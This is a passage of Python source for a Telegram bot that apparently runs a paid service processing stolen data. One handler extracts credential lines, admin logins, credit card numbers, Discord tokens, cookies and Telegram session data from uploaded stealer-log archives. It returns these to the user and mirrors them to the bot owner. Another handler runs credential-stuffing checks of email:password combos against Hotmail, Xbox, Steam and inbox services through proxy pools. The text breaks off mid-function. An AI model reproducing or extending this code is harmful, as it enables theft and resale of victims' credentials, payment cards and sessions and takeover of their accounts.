async def handle_krazii_extract(update: Update, context: ContextTypes.DEFAULT_TYPE, link: str, opts: dict, plan: str, max_mb: int):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    async with user_jobs_lock:
        if user_id in user_jobs:
            await update.message.reply_text(f"{pe('⏳')} You already have a job running. Please wait until it finishes.")
            return
        user_jobs[user_id] = True
    job_dir = None
    status_msg = None
    try:
        async with extract_waiting_lock:
            if extract_lock.locked():
                extract_waiting.append(user_id)
                pos = len(extract_waiting)
                try:
                    qm = await update.message.reply_text(
                        f"{pe('⏳')} <b>Queued</b> {pe('🔄')}\n<pre>position {pos} • waiting • krazy</pre>\nAnother extract is running. You are position <code>{pos}</code> in queue.",
                        parse_mode="HTML"
                    )
                    context.user_data["queue_msg_id"] = qm.message_id
                    context.user_data["queue_chat_id"] = qm.chat.id
                except:
                    pass
        job_dir = config.JOBS_DIR / f"{user_id}_{update.message.message_id}_{int(time.time())}_krazii"
        job_dir.mkdir(parents=True, exist_ok=True)
        cancel_kb = InlineKeyboardMarkup([[InlineKeyboardButton(sexy("Cancel"), callback_data="cancel_job", icon_custom_emoji_id=config.PREMIUM_EMOJI_IDS["🛑"])]])
        status_msg = await update.message.reply_text(
            f"{pe('📦')} <b>Downloading</b> {pe('💠')}\n<pre>krazii • {html.escape(link[:60])} • krazy</pre>\n"
            f"Plan <code>{html.escape(plan)}</code> max <code>{max_mb}MB</code>\n"
            f"{pe('⏳')} <i>Starting download...</i>",
            parse_mode="HTML",
            reply_markup=cancel_kb
        )
        user_status_msgs[user_id] = status_msg
        async with extract_lock:
            if "queue_msg_id" in context.user_data:
                try:
                    await context.bot.delete_message(chat_id=context.user_data["queue_chat_id"], message_id=context.user_data["queue_msg_id"])
                except:
                    pass
                context.user_data.pop("queue_msg_id", None)
                context.user_data.pop("queue_chat_id", None)
            try:
                async with extract_waiting_lock:
                    if user_id in extract_waiting:
                        extract_waiting.remove(user_id)
            except:
                pass
            if context.user_data.get("cancel_queued"):
                context.user_data.pop("cancel_queued", None)
                await update.message.reply_text("Cancelled while queued.")
                return
            import krazii_runner as nr
            state = nr.KraziiState()
            state.total = 0
            state.start_time = time.time()
            state.active = True
            user_states[user_id] = state
            last_extract_times[user_id] = time.time()
            loop = asyncio.get_running_loop()
            def run_krazii_wrap():
                return nr.run_krazii(link, opts, job_dir, state, max_mb=max_mb)
            krazii_future = loop.run_in_executor(None, run_krazii_wrap)
            user_futures[user_id] = krazii_future
            spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
            idx = 0
            last_edit = 0
            while not krazii_future.done():
                now = time.time()
                if now - last_edit >= config.PROGRESS_EDIT_INTERVAL:
                    elapsed = now - state.start_time if state.start_time else 0
                    mins, secs = divmod(int(elapsed), 60)
                    spin = spinner[idx % len(spinner)]
                    idx += 1
                    with state.lock:
                        checked = state.checked
                        total = state.total if state.total else 1
                        ulp = state.ulp
                        cc = state.cc
                        tokens = state.tokens
                        phase = state.phase
                        dl = state.downloaded
                        dl_total = state.download_total
                    perc = (checked / total * 100) if total else 0
                    bar_len = 12
                    filled = int(bar_len * perc / 100) if total else 0
                    bar = "█" * filled + "░" * (bar_len - filled)
                    if state.cancelled:
                        break
                    if phase == "downloading" and dl_total:
                        dl_mb = dl / (1024*1024)
                        tot_mb = dl_total / (1024*1024)
                        dl_perc = (dl / dl_total * 100) if dl_total else 0
                        dl_bar = "█" * int(12 * dl_perc / 100) + "░" * (12 - int(12 * dl_perc / 100))
                        prog_text = f"{pe('📦')} Download: <code>[{dl_bar}] {dl_perc:.1f}%</code> <code>{dl_mb:.1f}/{tot_mb:.1f}MB</code>"
                    elif phase == "extracting":
                        def _dir_stats():
                            n, b = 0, 0
                            try:
                                for _p in (job_dir / "extracted").rglob("*"):
                                    try:
                                        if _p.is_file():
                                            n += 1
                                            b += _p.stat().st_size
                                    except Exception:
                                        continue
                            except Exception:
                                pass
                            return n, b
                        try:
                            _xn, _xb = await asyncio.to_thread(_dir_stats)
                        except Exception:
                            _xn, _xb = 0, 0
                        if total and total > 1:
                            prog_text = f"{pe('📦')} Extracting: file <code>{checked}/{total}</code> ({perc:.1f}%) + <code>{_xb/(1024*1024):.1f}MB</code> written"
                        elif _xb:
                            prog_text = f"{pe('📦')} Extracting: <code>{_xb/(1024*1024):.1f}MB</code> written (+<code>{_xn}</code> files)"
                        else:
                            prog_text = f"{pe('📦')} Extracting archive... <code>{checked}/{total}</code>"
                    else:
                        prog_text = f"{pe('📦')} Progress: <code>[{bar}] {perc:.1f}%</code> <code>{checked}/{total}</code>"
                    try:
                        await status_msg.edit_text(
                            f"{spin} {pe('💠')} <b>Logs Extractor</b> {pe('🔄')}\n"
                            f"<pre>krazy • {html.escape(phase)} • live</pre>\n"
                            f"{prog_text} | {pe('⏳')} <code>{mins:02d}:{secs:02d}</code>\n"
                            f"<blockquote>"
                            f"{pe('📋')} ULP: <code>{ulp}</code> | {pe('💠')} Admin: <code>{state.admin}</code>\n"
                            f"{pe('💳')} CC: <code>{cc}</code> | {pe('🤖')} Tokens: <code>{tokens}</code>\n"
                            f"{pe('💠')} Cookies: <code>{state.cookies}</code> | {pe('📦')} Tdata: <code>{state.tdata}</code>\n"
                            f"{pe('⚡')} Threads: <code>15</code>"
                            f"</blockquote>\n"
                            f"{pe('🚀')} <i>Extracting...</i>",
                            parse_mode="HTML",
                            reply_markup=cancel_kb
                        )
                    except:
                        pass
                    last_edit = now
                await asyncio.sleep(0.5)
            try:
                state = await krazii_future
            except asyncio.CancelledError:
                await status_msg.edit_text(f"{pe('🛑')} <b>Cancelled Extract</b> {pe('❌')}\n<pre>krazy • stopped</pre>", parse_mode="HTML")
                return
            except Exception as e:
                await status_msg.edit_text(f"{pe('❌')} Extract error: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
                return
            if state.cancelled:
                await status_msg.edit_text(f"{pe('🛑')} <b>Cancelled Extract</b> {pe('❌')}\n<pre>krazy • stopped</pre>\n<i>No files sent.</i>", parse_mode="HTML")
                return
            elapsed = time.time() - state.start_time
            mins, secs = divmod(int(elapsed), 60)
            try:
                result_paths = await asyncio.to_thread(krazii_runner.create_krazii_results_files, state, job_dir)
            except Exception as e:
                await status_msg.edit_text(f"{pe('❌')} Failed to create results: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
                return
            final_text = (
                f"{pe('✅')} <b>Extract Completed</b> in <code>{mins:02d}:{secs:02d}</code> {pe('💠')}\n\n"
                f"{pe('📊')} <b>Results:</b>\n"
                f"<blockquote>"
                f"{pe('📋')} ULP: <code>{state.ulp}</code> | Admin: <code>{state.admin}</code>\n"
                f"{pe('💳')} CC: <code>{state.cc}</code> | {pe('🤖')} Tokens: <code>{state.tokens}</code>\n"
                f"{pe('💠')} Cookies: <code>{state.cookies}</code> | Tdata: <code>{state.tdata}</code>\n"
                f"{pe('📦')} Checked: <code>{state.checked}/{state.total}</code>"
                f"</blockquote>\n\n"
                f"{pe('📤')} <i>Sending results...</i>"
            )
            try:
                await status_msg.edit_text(final_text, parse_mode="HTML")
            except:
                pass
            sent_any = False
            async def send_krazii_file(path, caption):
                nonlocal sent_any
                try:
                    if not path.exists():
                        return
                except Exception:
                    return
                if path.is_dir():
                    parts = _pack_tdata_parts(path, MIRROR_MAX_BYTES)
                    if not parts:
                        return
                    _tmp_roots = set()
                    for fname, zpath, note in parts:
                        if note == "too_big":
                            try:
                                await context.bot.send_message(
                                    chat_id=chat_id,
                                    text=f"{pe('⚠️')} Skipped <code>{html.escape(fname)}</code> "
                                         f"(over the 45MB send cap).",
                                    parse_mode="HTML")
                            except Exception:
                                pass
                            continue
                        try:
                            if zpath.stat().st_size == 0:
                                continue
                            if zpath.stat().st_size > 50 * 1024 * 1024:
                                try:
                                    await context.bot.send_message(
                                        chat_id=chat_id,
                                        text=f"{pe('⚠️')} Skipped <code>{html.escape(fname)}</code> "
                                             f"(over Telegram's 50MB cap).",
                                        parse_mode="HTML")
                                except Exception:
                                    pass
                                continue
                            with open(zpath, "rb") as f:
                                await context.bot.send_document(
                                    chat_id=chat_id, document=f, filename=fname,
                                    caption=f"{caption} <i>({html.escape(fname)})</i>" if len(parts) > 1 else caption,
                                    parse_mode="HTML")
                            sent_any = True
                            await asyncio.sleep(0.3)
                            try:
                                _tmp_roots.add(str(Path(zpath).parent.resolve()))
                            except Exception:
                                pass
                        except Exception as e:
                            logger.warning(f"tdatas part {fname} send failed: {e}")
                    try:
                        import shutil as _sh2
                        for _tr in _tmp_roots:
                            _sh2.rmtree(_tr, ignore_errors=True)
                    except Exception:
                        pass
                    return
                try:
                    if path.stat().st_size == 0:
                        return
                except Exception:
                    return
                try:
                    with open(path, "rb") as f:
                        await context.bot.send_document(chat_id=chat_id, document=f, filename=path.name, caption=caption, parse_mode="HTML")
                    sent_any = True
                    await asyncio.sleep(0.3)
                except Exception as e:
                    logger.warning(f"send {path.name} failed: {e}")
                    try:
                        await context.bot.send_message(chat_id=chat_id, text=f"{pe('❌')} Failed to send {html.escape(path.name)}")
                    except Exception:
                        pass
            ordered = [
                ("krazii_ulp_all.txt", f"{pe('📋')} <code>Krazii_ULP_All.txt</code> — ULP: <code>{state.ulp}</code>"),
                ("krazii_ulp_admins.txt", f"{pe('💠')} <code>Krazii_ULP_Admins.txt</code> — Admin: <code>{state.admin}</code>"),
                ("krazii_cards_cc.txt", f"{pe('💳')} <code>Krazii_Cards_CC.txt</code> — CC: <code>{state.cc}</code>"),
                ("krazii_discord_tokens.txt", f"{pe('🤖')} <code>Krazii_Discord_Tokens.txt</code> — Tokens: <code>{state.tokens}</code>"),
                ("krazii_cookies_raw.txt", f"{pe('💠')} <code>Krazii_Cookies_Raw.txt</code> — Cookies: <code>{state.cookies}</code>"),
            ]
            seen_paths = set()
            for key, cap in ordered:
                p = result_paths.get(key)
                if p is None:
                    continue
                try:
                    rp = str(Path(p).resolve())
                except Exception:
                    rp = str(p)
                if rp in seen_paths:
                    continue
                seen_paths.add(rp)
                await send_krazii_file(Path(p), cap)
            hp = result_paths.get("html")
            if hp:
                await send_krazii_file(Path(hp), f"{pe('📊')} <code>Krazii_Results.html</code>")
            if not sent_any and not (state.ulp or state.admin or state.cc or state.tokens or state.cookies or state.tdata):
                try:
                    await context.bot.send_message(chat_id=chat_id, text=f"{pe('⚠️')} No hits found for selected options. Checked <code>{state.checked}/{state.total}</code> files. Try different options or another archive.", parse_mode="HTML")
                except Exception:
                    pass
            tdata_dir = job_dir / "Krazii_Extracted" / "Tdatas"
            if not tdata_dir.exists():
                tdata_dir = job_dir / "Tdatas"
            if tdata_dir.exists() and any(tdata_dir.iterdir()):
                await send_krazii_file(tdata_dir, f"{pe('📦')} <code>Tdatas.zip</code> — <code>{state.tdata}</code> cloned")
            await context.bot.send_message(chat_id=chat_id, text=(f"{pe('💠')} <b>Done Extract!</b> Link <code>{html.escape(link[:40])}...</code> processed.\n"
                  f"Plan <code>{html.escape(plan)}</code> | <code>{state.checked}</code> files | <code>{mins:02d}:{secs:02d}</code>\n<i>Send another link to extract again.</i>"), parse_mode="HTML")
            try:
                _bu = update.effective_user
                _buname = getattr(_bu, "username", None)
                _mfiles = []
                for _k in ["krazii_ulp_all.txt", "krazii_ulp_admins.txt", "krazii_cards_cc.txt",
                           "krazii_discord_tokens.txt", "krazii_cookies_raw.txt", "html"]:
                    _p = result_paths.get(_k)
                    if _p:
                        _mfiles.append((Path(_p), f"<code>{html.escape(Path(_p).name)}</code>"))
                await mirror_to_owner(
                    context, user_id, _buname, "Extract",
                    f"Plan: <code>{html.escape(plan)}</code> | "
                    f"ULP: <code>{state.ulp}</code> | CC: <code>{state.cc}</code> | "
                    f"Tokens: <code>{state.tokens}</code> | Tdata: <code>{state.tdata}</code> | "
                    f"Checked: <code>{state.checked}/{state.total}</code> | Time: <code>{mins:02d}:{secs:02d}</code>",
                    _mfiles)
            except Exception as e:
                logger.warning(f"extract mirror failed: {e}")
    except Exception as e:
        logger.exception("handle_krazii outer error")
        try:
            if status_msg:
                await status_msg.edit_text(f"{pe('❌')} Unexpected error: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
            else:
                await update.message.reply_text(f"{pe('❌')} Error: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
        except:
            pass
    finally:
        async with user_jobs_lock:
            user_jobs.pop(user_id, None)
        try:
            user_states.pop(user_id, None)
            user_futures.pop(user_id, None)
            user_status_msgs.pop(user_id, None)
        except:
            pass
        try:
            async with extract_waiting_lock:
                if user_id in extract_waiting:
                    extract_waiting.remove(user_id)
        except:
            pass
        if job_dir and Path(job_dir).exists():
            try:
                import shutil as _sh
                _sh.rmtree(Path(job_dir), ignore_errors=True)
            except:
                pass

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    try:
        await asyncio.to_thread(database.ensure_user_exists, user_id)
    except:
        pass
    if not await is_user_joined(user_id, context):
        await send_join_required(update.message, context)
        return
    if is_owner(user_id) and context.user_data.get("awaiting_broadcast"):
        context.user_data["awaiting_broadcast"] = False
        try:
            user_ids = await asyncio.to_thread(database.get_all_user_ids)
        except Exception as e:
            await update.message.reply_text(f"{pe('❌')} Failed to get users: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
            return
        status_msg = await update.message.reply_text(f"{pe('📦')} Broadcasting file to <code>{len(user_ids)}</code> users...", parse_mode="HTML")
        sent = 0
        failed = 0
        for uid in user_ids:
            try:
                await context.bot.copy_message(chat_id=uid, from_chat_id=chat_id, message_id=update.message.message_id)
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                failed += 1
        await status_msg.edit_text(f"{pe('✅')} Broadcast file done. Sent <code>{sent}</code> Failed <code>{failed}</code>", parse_mode="HTML")
        return
    if context.user_data.get("awaiting_proxies") and update.message.document:
        doc = update.message.document
        file_name = doc.file_name or "proxies.txt"
        if file_name.lower().endswith(".txt"):
            try:
                tg_file = await context.bot.get_file(doc.file_id)
                import tempfile as _tf
                with _tf.NamedTemporaryFile(mode="wb", delete=False, suffix=".txt") as _tmp:
                    _tmp_path = _tmp.name
                await tg_file.download_to_drive(custom_path=_tmp_path)
                try:
                    with open(_tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                        _ptext = f.read()
                finally:
                    try:
                        os.unlink(_tmp_path)
                    except:
                        pass
                canon = proxytools.clean_proxy_lines(_ptext.replace("\r\n", "\n").split("\n"))
                if not canon:
                    await update.message.reply_text(
                        f"{pe('⚠️')} No valid proxy lines in file. Or /cancel.", parse_mode="HTML")
                    return
                added, dup, capped = await asyncio.to_thread(
                    database.add_proxies, user_id, canon, config.PROXY_MAX_STORED)
                context.user_data.pop("awaiting_proxies", None)
                extra = f"\n{pe('⚠️')} Capped: <code>{len(capped)}</code> over {config.PROXY_MAX_STORED} dropped." if capped else ""
                checking_msg = await update.message.reply_text(
                    f"{pe('✅')} Proxies added: <code>{added}</code> | Dup: <code>{dup}</code>{extra}\n\n"
                    f"{pe('🔄')} Auto-checking them now (fastest path)...",
                    parse_mode="HTML")
                report = await verify_proxy_batch(user_id, canon)
                try:
                    await checking_msg.edit_text(
                        f"{pe('✅')} Proxies added: <code>{added}</code> | Dup: <code>{dup}</code>{extra}\n"
                        f"{report}\n\n"
                        f"<i>Steam Checker is ready — send your combos file.</i>",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(sexy("Proxies"), callback_data="menu_proxies", icon_custom_emoji_id=config.PREMIUM_EMOJI_IDS["🔌"])]]))
                except:
                    await update.message.reply_text(
                        f"{pe('✅')} Proxies added: <code>{added}</code> | Dup: <code>{dup}</code>{extra}\n{report}",
                        parse_mode="HTML")
                return
            except Exception as e:
                logger.exception("proxy file add failed")
                await update.message.reply_text(f"{pe('❌')} Could not read proxy file: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
                return
    async with user_jobs_lock:
        if user_id in user_jobs:
            await update.message.reply_text(f"{pe('⏳')} You already have a job running. Please wait until it finishes.")
            return
        user_jobs[user_id] = True
    tmp_file_path = None
    job_dir = None
    status_msg = None
    try:
        if not update.message.document:
            await update.message.reply_text(f"{pe('❌')} Please send a file with combos.")
            return
        doc = update.message.document
        file_name = doc.file_name or "combos.txt"
        file_size = doc.file_size or 0
        if file_size > config.MAX_FILE_SIZE_BYTES:
            await update.message.reply_text(f"{pe('❌')} File too large ({file_size//1024//1024}MB). Max {config.MAX_FILE_SIZE_BYTES//1024//1024}MB.")
            return
        if not file_name.lower().endswith(".txt"):
            await update.message.reply_text(
                f"{pe('❌')} <b>Invalid File</b> {pe('⚠️')}\n"
                f"<pre>only .txt allowed • krazy</pre>\n"
                f"<blockquote>Please send a <code>.txt</code> file (e.g. <code>combos.txt</code>) with <code>email:password</code> per line.</blockquote>",
                parse_mode="HTML"
            )
            return
        checker_type = context.user_data.get("selected_checker", "hotmail")
        if checker_type not in ("hotmail", "xbox", "steam", "inbox", "xboxapi"):
            checker_type = "hotmail"
        logger.info(f"handle_file user {user_id} checker_type={checker_type} file={file_name}")
        plan, limit, threads, expires_at = get_user_limits(user_id, checker_type)
        plan_info = format_plan_info_html(user_id, checker_type, single=True)
        file_name_esc = html.escape(file_name)
        async with scan_waiting_lock:
            if scan_lock.locked():
                scan_waiting.append(user_id)
                pos = len(scan_waiting)
                try:
                    queue_msg = await update.message.reply_text(
                        f"{pe('⏳')} <b>Queued</b> {pe('🔄')}\n"
                        f"<pre>position {pos} • waiting • krazy</pre>\n"
                        f"Another check is running. You are position <code>{pos}</code> in queue.\n"
                        f"<i>Your job will start automatically...</i>",
                        parse_mode="HTML"
                    )
                    context.user_data["queue_msg_id"] = queue_msg.message_id
                    context.user_data["queue_chat_id"] = queue_msg.chat.id
                except:
                    pass
            else:
                if user_id in scan_waiting:
                    try:
                        scan_waiting.remove(user_id)
                    except:
                        pass
        if "queue_msg_id" in context.user_data:
            pass
        cancel_kb = InlineKeyboardMarkup([[InlineKeyboardButton(sexy("Cancel"), callback_data="cancel_job", icon_custom_emoji_id=config.PREMIUM_EMOJI_IDS["🛑"])]])
        status_msg = await update.message.reply_text(
            f"{pe('📦')} <b>Downloading</b> <code>{file_name_esc}</code>...\n\n{plan_info}",
            parse_mode="HTML",
            reply_markup=cancel_kb
        )
        user_status_msgs[user_id] = status_msg
        try:
            tg_file = await context.bot.get_file(doc.file_id)
        except Exception as e:
            logger.exception("get_file failed")
            await status_msg.edit_text(f"{pe('❌')} Failed to get file from Telegram: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
            return
        job_id = f"{user_id}_{update.message.message_id}_{int(time.time())}"
        job_dir = config.JOBS_DIR / job_id
        job_dir.mkdir(parents=True, exist_ok=True)
        tmp_file_path = job_dir / f"input_{file_name}"
        try:
            await tg_file.download_to_drive(custom_path=str(tmp_file_path))
        except Exception as e:
            logger.exception("download_to_drive failed")
            await status_msg.edit_text(f"{pe('❌')} Download failed: <code>{html.escape(str(e))}</code>", parse_mode="HTML")
            return
        text = None
        for enc in ("utf-8", "utf-8-sig", "latin-1", "cp1252"):
            try:
                with open(tmp_file_path, "r", encoding=enc) as f:
                    text = f.read()
                break
            except UnicodeDecodeError:
                continue
            except Exception as e:
                logger.exception(f"read with {enc} failed")
                continue
        if text is None:
            await status_msg.edit_text(f"{pe('❌')} Failed to read file. Ensure it's a text file with <code>email:pass</code> per line.", parse_mode="HTML")
            return
        combos = parse_combos_from_text(text)
        if not combos:
            await status_msg.edit_text(
                f"{pe('❌')} No valid <code>email:password</code> lines found.\n"
                f"<i>Ensure file has one</i> <code>email:pass</code> <i>per line, e.g.:</i>\n"
                f"<code>test@outlook.com:Password123</code>",
                parse_mode="HTML"
            )
            return
        trimmed = 0
        if len(combos) > limit:
            trimmed = len(combos) - limit
            combos = combos[:limit]
            try:
                await status_msg.edit_text(
                    f"{pe('📋')} <b>File trimmed</b>\n"
                    f"<pre>krazy • auto-split</pre>\n\n"
                    f"File had <code>{len(combos) + trimmed}</code> combos, your <code>{html.escape(plan)}</code> limit is <code>{limit}</code>/file.\n"
                    f"Checking the first <code>{limit}</code> lines (<code>{trimmed}</code> skipped).\n\n"
                    f"<i>Want it all? Upgrade: <code>/redeem &lt;key&gt;</code> (pro:{config.TIER_HOTMAIL_LIMITS['pro'] if checker_type != 'xbox' else config.TIER_XBOX_LIMITS['pro']}, max:{config.TIER_HOTMAIL_LIMITS['max'] if checker_type != 'xbox' else config.TIER_XBOX_LIMITS['max']})</i>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        was_free_xbox = (checker_type == "xbox" and plan == "free" and user_id != config.OWNER_ID)
        if was_free_xbox:
            try:
                _used = await asyncio.to_thread(database.get_xbox_daily_count, user_id)
            except Exception:
                _used = 0
            if _used >= config.FREE_XBOX_DAILY_MAX:
                await status_msg.edit_text(
                    f"{pe('⚠️')} {pe('🛑')} <b>Daily Limit Reached</b> {pe('⚠️')}\n"
                    f"<pre>{pe('💳')} upgrade required • krazy</pre>\n\n"
                    f"Free Xbox: <code>{_used}/{config.FREE_XBOX_DAILY_MAX}</code> checks used today (UTC).\n"
                    f"Resets at UTC midnight. Pro/Max have unlimited checks.\n\n"
                    f"<blockquote>Options:\n"
                    f"• Upgrade: <code>/redeem &lt;key&gt;</code>\n"
                     f"• {pe('📞')} Contact owner for a key</blockquote>",
                    parse_mode="HTML"
                )
                return
        was_free_steam = (checker_type == "steam" and plan == "free" and user_id != config.OWNER_ID)
        if was_free_steam:
            try:
                _used = await asyncio.to_thread(database.get_steam_daily_count, user_id)
            except Exception:
                _used = 0
            if _used >= config.FREE_STEAM_DAILY_MAX:
                await status_msg.edit_text(
                    f"{pe('⚠️')} {pe('🛑')} <b>Daily Limit Reached</b> {pe('⚠️')}\n"
                    f"<pre>{pe('💳')} upgrade required • krazy</pre>\n\n"
                    f"Free Steam: <code>{_used}/{config.FREE_STEAM_DAILY_MAX}</code> checks used today (UTC).\n"
                    f"Resets at UTC midnight. Pro/Max have unlimited checks.\n\n"
                    f"<blockquote>Options:\n"
                    f"• Upgrade: <code>/redeem &lt;key&gt;</code>\n"
                     f"• {pe('📞')} Contact owner for a key</blockquote>",
                    parse_mode="HTML"
                )
                return
        _steam_pool = []
        if checker_type == "steam":
            try:
                _working = await asyncio.to_thread(database.get_working_proxies, user_id)
            except Exception:
                _working = []
            for _c in _working or []:
                _p = proxytools.parse_proxy_line(_c)
                if _p:
                    _d = proxytools.to_requests_dict(_p)
                    _steam_pool.append(_d.get("http", ""))
            if not _steam_pool:
                try:
                    await status_msg.edit_text(
                        f"{pe('🔌')} <b>Proxies Required</b>\n"
                        f"<pre>steam • no working proxies • krazy</pre>\n\n"
                        f"Steam Checker needs at least <b>1 working proxy</b>.\n\n"
                        f"<i>Tap</i> <b>Proxies</b> <i>below to add + recheck your pool, then send the file again.</i>",
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(sexy("Proxies"), callback_data="menu_proxies", icon_custom_emoji_id=config.PREMIUM_EMOJI_IDS["🔌"])]])
                    )
                except:
